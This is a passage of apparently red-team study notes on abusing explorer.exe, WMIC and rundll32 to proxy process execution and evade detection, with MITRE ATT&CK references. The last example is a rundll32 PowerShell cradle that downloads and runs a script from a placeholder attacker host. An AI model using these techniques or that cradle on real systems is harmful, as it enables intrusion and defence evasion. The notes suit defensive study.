hese techniques rely on **legitimate system tools** to spawn malicious processes.

---

## File Explorer (explorer.exe)

### Description

`explorer.exe` is the Windows **file manager and shell**.  
It can be abused to execute binaries, making the payload appear as a **child of a trusted parent process**.

- **Technique:** Indirect Command Execution
    
- **Benefit:** Trusted parent process → reduced suspicion
    

---

### Binary Locations

- **64-bit:**  
    `C:\Windows\explorer.exe`
    
- **32-bit:**  
    `C:\Windows\SysWOW64\explorer.exe`
    

---

### Example: Executing a Binary via Explorer

`explorer.exe /root,"C:\Windows\System32\calc.exe"`

**Result:**

- `calc.exe` is launched
    
- Parent process is `explorer.exe`
    

---

## WMIC (Windows Management Instrumentation)

### Description

`wmic.exe` is a command-line interface for **Windows Management Instrumentation (WMI)**.  
It can be abused to **spawn new processes**, bypassing some defensive detections.

- **MITRE ATT&CK:**  
    **T1218 – Signed Binary Proxy Execution**
    

---

### Example: Process Creation with WMIC

`wmic.exe process call create calc`

**Outcome:**

- Creates a new `calc.exe` process
    
- Execution is handled via WMI APIs
    

**Why It’s Abused:**

- Looks like legitimate administrative activity
    
- Commonly allowed in enterprise environments
    

---

## Rundll32

### Description

`rundll32.exe` is a Windows utility used to **load and execute functions inside DLLs**.  
Red teams abuse it to:

- Execute arbitrary binaries
    
- Run JavaScript
    
- Execute PowerShell payloads in memory
    
- **MITRE ATT&CK:**  
    **T1218 – Signed Binary Proxy Execution: Rundll32**
    

---

### Binary Locations

- **64-bit:**  
    `C:\Windows\System32\rundll32.exe`
    
- **32-bit:**  
    `C:\Windows\SysWOW64\rundll32.exe`
    

---

### Example: Executing a Binary via JavaScript

`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");`

**What Happens:**

- Rundll32 loads `mshtml.dll`
    
- JavaScript engine executes `calc.exe`
    

---

### Example: Executing PowerShell via Rundll32

`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");`